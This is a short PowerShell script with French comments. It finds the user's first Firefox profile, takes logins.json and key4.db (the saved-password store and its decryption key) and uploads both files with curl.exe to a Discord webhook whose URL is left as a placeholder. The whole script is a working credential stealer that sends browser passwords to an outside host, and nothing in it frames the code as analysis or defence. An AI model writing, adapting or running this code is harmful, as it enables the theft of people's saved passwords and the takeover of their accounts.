# --- CONFIGURATION ---
$hook = "TON_URL_WEBHOOK_DISCORD"

# --- RECHERCHE DU PROFIL ---
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
$profile = Get-ChildItem -Path $ffPath -Directory | Select-Object -First 1

if ($profile) {
    $lPath = Join-Path $profile.FullName "logins.json"
    $kPath = Join-Path $profile.FullName "key4.db"

    # On vérifie si les fichiers existent
    if (Test-Path $lPath, $kPath) {
        # On les envoie un par un vers Discord
        foreach ($file in $lPath, $kPath) {
            # Discord permet d'envoyer des fichiers via Webhook en utilisant curl.exe (présent sur Windows 10/11)
            curl.exe -F "file=@$file" $hook
        }
    }
}
